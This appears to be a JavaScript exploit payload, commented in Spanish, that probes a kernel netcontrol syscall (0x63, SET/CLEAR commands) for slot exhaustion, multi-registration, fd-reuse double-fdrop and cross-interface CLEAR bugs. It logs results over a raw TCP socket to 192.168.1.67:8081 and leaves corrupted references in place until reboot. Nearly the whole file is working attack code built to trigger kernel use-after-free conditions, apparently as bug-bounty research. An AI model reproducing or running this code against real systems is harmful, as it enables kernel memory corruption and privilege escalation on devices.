// 2026-08-28 netctl5_variants_1320: variantes del SET (0x20000003) NO cubiertas por slidybat: el H1 solo reporto el CLEAR fd-reuse (parcheado 13.20) -> https://hackerone.com/reports/3320669
// F1 CENSO slots ifx=1 (SET s0..s7 cap12, paro 1er errno5, exitos ABIERTOS) | F2 fd-reuse slidybat ifx=1,2 + fcntl cond | F3 1 socket en ifx1/2/3->close->re-SET->reuse colgantes | F4 CLEAR cruzado.
// PREMISA: el SET y su gestion de slots/nombres NUNCA fue reportada (solo el CLEAR; parche -> errno 5 siempre). ifx1/2/3 aceptan SET (ifx0 sucio persistente). Reportable: censo>3, multi-registro, N-colgantes/close, cruzado-match.
// Canal W()=TCP crudo 192.168.1.67:8081; nc()=W+write64(fd,B8)+syscall(0x63,ifx,cmd,buf,8)+W ret/errno. SET=0x20000003 CLEAR=0x20000007 fcntl=0x5C F_SETFL=4. Sin mmap/thr_new/rfork/read64; acotado; <9KB.
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const NCX=0x63n,SETQ=0x20000003n,CLRQ=0x20000007n,YIELD=331n,F_SETFL=4n;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{return parseInt(get_error_string(),10)||-1}catch(e){return -1}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
W("[netctl5] inicio canal "+(sock>=0n?"OK":"MUERTO")+" - SET variants fuera de H1-3320669");
const B8=malloc(8),SUM=[],KEEP=[];
const mk=(t,i)=>{const fd=I(syscall(SYSCALL.socket,2n,1n,0n));W(t+": socket s"+i+" fd="+fd);return fd};
const nc=(v,fd,ifx,cmd,d)=>{const p=v+": "+d+" (fd="+fd+") ifx=0x"+Number(ifx).toString(16);W(p+"...");write64(B8,fd);const r=I(syscall(NCX,B(ifx),cmd,B8,8n));const e=r<0?EN():0;W(p+" -> ret="+r+(r<0?" errno="+e:""));return{r,e}};
const RS=(q)=>q.r>=0n?"ret0":"e"+q.e;
const fctag=(t,fd)=>{let f=0;for(let k=1;k<=100;k++){syscall(SYSCALL.fcntl,fd,F_SETFL,0n);f=k;if(k%20===0)W(t+": fcntl x"+k+"/100 VIVA fd="+fd)}return f};
const CL=(f)=>syscall(SYSCALL.close,f);
// ===== F1: CENSO slots ifx=1 =====
let f1n=0,f1max=0;const f1open=[];
try{
W("== FASE 1: CENSO slots ifx=1 (SET secuencial, cap 12) ==");
const censo=(a,b)=>{for(let i=a;i<b;i++){const fd=mk("F1",i);
 if(fd<0n){W("F1: socket fallo s"+i+" -> censo parcial");return}
 const q=nc("F1",fd,1,SETQ,"SET s"+i);
 if(q.r<0n){W("F1: s"+i+" RECHAZADO errno="+q.e+" -> tope de slots");CL(fd);return}
 f1n++;f1open.push(Number(fd));W("F1: s"+i+" ok slot "+f1n+" fd="+fd+" ABIERTO (ref viva=estado)");}};
censo(0,8);f1max=8;
if(f1n===8){W("F1: 8/8 -> extiendo 4 mas");censo(8,12);f1max=12;
 if(f1n===12)W("F1: CAP 12 -> >=12 slots o sin tope por interfaz")}
W("F1 censo ifx=1: "+f1n+" slots aceptados de "+f1max);
if(f1n>3)N("[netctl5] HITO F1: ifx=1 acepto "+f1n+" SETs (>3 del reporte): mas slots de lo dicho");
SUM.push("F1="+f1n+"/"+f1max+" abiertos=["+f1open.join(",")+"]");
}catch(e){W("F1 EX: "+e);SUM.push("F1 EX")}
// ===== F2: fd-reuse slidybat sobre ifx=1,2 =====
const F2=[];
try{
W("== FASE 2: fd-reuse (SET->close->newsock->CLEAR) ifx=1,2 ==");
for(const x of [1,2]){
 const o={x,reuse:false,clr:"?",f:0};F2.push(o);
 const s1=mk("F2-"+x,1);
 if(s1<0n){o.clr="sinsock";continue}
 const qs=nc("F2-"+x,s1,x,SETQ,"SET s1 fresco");
 if(qs.r<0n){o.clr="noset-e"+qs.e;W("F2-"+x+": SET errno="+qs.e+" sin netevent fresco"+(x===1?" (F1 lleno ifx=1)":""));CL(s1);continue}
 CL(s1);
 const s2=mk("F2-"+x,2);
 if(s2<0n){o.clr="sinsock2";continue}
 o.reuse=(s2===s1);
 W("F2-"+x+": fd_s1="+s1+" fd_s2="+s2+" reuse="+(o.reuse?"SI":"NO (CLEAR=control)"));
 const qc=nc("F2-"+x,s2,x,CLRQ,"CLEAR fd-reuse");
 if(qc.r>=0n){
  o.clr="MATCH";
  W("F2-"+x+": !!! CLEAR ret=0 = DOBLE FDROP ifx="+x+" sobre s2 (sin ref; refcnt roto)");
  o.f=fctag("F2-"+x,s2);
  W("F2-"+x+": sobrevivi fcntl x"+o.f+"/100"+(o.f>=100?" (UAF latente)":" (paro x"+o.f+": trigger mordo)"));
  N("[netctl5] fd-reuse ifx="+x+": DOBLE FDROP CONFIRMADO (fcntl x"+o.f+")");
 }else{o.clr="e"+qc.e;W("F2-"+x+": CLEAR errno="+qc.e+": PARCHADO en ifx="+x+" (skip/no-match) s2 intacto")}
 if(o.clr==="MATCH")W("F2-"+x+": NOTA: close s2="+s2+" con refcnt roto = trigger extra (muerte aqui => este close; estado=experimento)");
 CL(s2);W("F2-"+x+": s2 cerrado VIVA");}
SUM.push("F2 "+F2.map(o=>"ifx"+o.x+"["+(o.reuse?"reuse":"noreuse")+" "+o.clr+(o.f?" fctl"+o.f:"")+"]").join(" "));
}catch(e){W("F2 EX: "+e);SUM.push("F2 EX")}
// ===== F3: UN socket en ifx1/2/3 =====
let fdS=-1,nreg=0,f3reuse=false,f3drops=-1,f3f=0;const F3map=[];
try{
W("== FASE 3: UN socket en ifx=1,2,3 -> close -> re-SET -> reuse ==");
const sM=mk("F3",0);
if(sM>=0n){
 const q1=nc("F3",sM,1,SETQ,"SET s");
 const q2=nc("F3",sM,2,SETQ,"SET s");
 const q3=nc("F3",sM,3,SETQ,"SET s");
 nreg=(q1.r>=0n?1:0)+(q2.r>=0n?1:0)+(q3.r>=0n?1:0);
 W("F3: registros fd "+sM+": ifx1="+RS(q1)+" ifx2="+RS(q2)+" ifx3="+RS(q3)+" ("+nreg+"/3)");
 if(nreg>=2)N("[netctl5] HITO F3: fd="+sM+" en "+nreg+" netevents a la vez: el SET NO deduplica");
 fdS=Number(sM);
 CL(sM);
 W("F3: close(s="+sM+") socket con "+nreg+" registros cerrado - ¿cuantas refs colgantes quedan? (fd "+fdS+" libre)");}
for(const x of [1,2,3]){
 const sx=mk("F3r",x);
 if(sx<0n){F3map.push("sockfail");continue}
 const q=nc("F3r",sx,x,SETQ,"re-SET ifx="+x);
 if(q.r>=0n){F3map.push("OK");W("F3r: ifx="+x+" OK: cerrado NO ocupa (close limpio o sobran slots) fd="+sx+" ABIERTO");KEEP.push(Number(sx));}
 else{F3map.push("e"+q.e);W("F3r: ifx="+x+" errno="+q.e+": OCUPADO por el cerrado = COLGANTE por UN close");CL(sx);}}
W("F3 mapa re-SET: ifx1="+F3map[0]+" ifx2="+F3map[1]+" ifx3="+F3map[2]+(nreg>0&&F3map.filter(c=>c!=="OK").length===nreg?" -> "+nreg+" colgantes nuevos de UNA vez":""));
const sR=fdS>=0?mk("F3R",9):-1n;
if(sR>=0n){
 f3reuse=(Number(sR)===fdS);
 W("F3R: sR fd="+sR+" colgante="+fdS+" reuse="+(f3reuse?"CONFIRMADO":"NO (CLEARs=control, esperado e5)"));
 const dr=[];let drops=0;
 for(const x of [1,2,3]){const q=nc("F3R",sR,x,CLRQ,"CLEAR fd "+(f3reuse?"COLGANTE":"(control)"));if(q.r>=0n)drops++;dr.push(RS(q));}
 f3drops=drops;
 W("F3R: CLEARs sR: "+dr.join(" ")+" matches="+drops+"/3"+(f3reuse?" -> fd-reuse contra 3 colgantes del MISMO fd":""));
 if(f3reuse&&drops>0){
  if(drops>=3)N("[netctl5] !!! TRIPLE FDROP desde UN close: 1 socket x 3 netevents");
  else N("[netctl5] HITO F3: "+drops+" fdrop(s) indebido(s) via fd-reuse");
  f3f=fctag("F3R",sR);
  W("F3R: sobrevivi fcntl x"+f3f+"/100 sobre sR (-"+drops+" ref)"+(f3f>=100?" sin efecto":" - paro x"+f3f));}
 W("F3R: cierro sR "+(f3reuse&&drops>0?"(refcnt danada: close=trigger extra)":"(limpio)"));
 CL(sR);W("F3R: sR cerrado VIVA");}
SUM.push("F3 reg="+nreg+"/3 cerrado="+fdS+" reSET["+F3map.join(" ")+"] reuse="+(f3reuse?"si":"no")+" drops="+f3drops+(f3f?" fctl"+f3f:""));
}catch(e){W("F3 EX: "+e);SUM.push("F3 EX")}
// ===== F4: CLEAR cruzado =====
let xcr="-",F4a="-",F4b="-";
try{
W("== FASE 4: CLEAR CRUZADO (fd s_a en ifx=2) + correctos ==");
const sA=mk("F4",0);
if(sA>=0n){const qa=nc("F4",sA,1,SETQ,"SET s_a");if(qa.r>=0n)KEEP.push(Number(sA));else CL(sA);}
const sB=mk("F4",1);
if(sB>=0n){const qb=nc("F4",sB,2,SETQ,"SET s_b");if(qb.r>=0n)KEEP.push(Number(sB));else CL(sB);}
if(sA>=0n){
 const qx=nc("F4",sA,2,CLRQ,"CLEAR CRUZADO fd(s_a)");xcr=RS(qx);
 W("F4 cruzado -> "+(qx.r>=0n?"ret=0 RARO: ifx=2 matcheo fd jamas registrado ahi (fd="+sA+"): fdrop indebido de s_a (vivo en ifx=1)":"errno "+qx.e+": no-match limpio (solo ve sus slots)"));
 if(qx.r>=0n)N("[netctl5] HITO F4: CLEAR cruzado MATCH: fds ajenos dropeables");}
if(sB>=0n){const q=nc("F4",sB,2,CLRQ,"CLEAR legitimo s_b");F4b=RS(q);
 W("F4 s_b legitimo -> "+(q.r>=0n?"ret=0: matching VIVO legitimo (suelta la ref del SET; no doble fdrop)":"errno "+q.e+": muerto hasta en legitimo = parche total"));}
if(sA>=0n){const q=nc("F4",sA,1,CLRQ,"CLEAR legitimo s_a");F4a=RS(q);if(q.r>=0n)W("F4 s_a ret0: ver nota s_b");}
SUM.push("F4 cruz="+xcr+" okB="+F4b+" okA="+F4a);
}catch(e){W("F4 EX: "+e);SUM.push("F4 EX")}
// ===== final =====
W("== RESUMEN 4 fases ==");for(const l of SUM)W("  "+l);
const hits=[];
if(f1n>3)hits.push("ifx1="+f1n+"slots>3");
const m2=F2.filter(o=>o.clr==="MATCH").map(o=>o.x);
if(m2.length)hits.push("doble-fdrop-vivo["+m2.join("/")+"]");
if(nreg>=2)hits.push("multireg"+nreg);
if(f3reuse&&f3drops>0)hits.push("reuse-colgantes-drop"+f3drops);
if(xcr!=="-"&&xcr[0]!=="e")hits.push("cruzado-match");
W("[netctl5] netevents VIVOS ABIERTOS: ["+f1open.concat(KEEP).join(",")+"] (persisten; fix=reboot)");
const vrd="netctl5: F1="+f1n+"/"+f1max+" F2=["+F2.map(o=>o.x+":"+o.clr).join(",")+"] F3 reg"+nreg+"/3 drops"+f3drops+" F4 "+xcr+"/"+F4b+" | "+(hits.length?"HITS: "+hits.join(","):"sin hits");
W("[netctl5] VEREDICTO: "+vrd);N(vrd.slice(0,120));
for(let i=0;i<100;i++){N("["+(100-i)+"] netctl5 vivo");for(let j=0;j<3000;j++){syscall(YIELD)}}
W("PAYLOAD DONE");
try{if(sock>=0n)syscall(SYSCALL.close,sock)}catch(e){}
})();
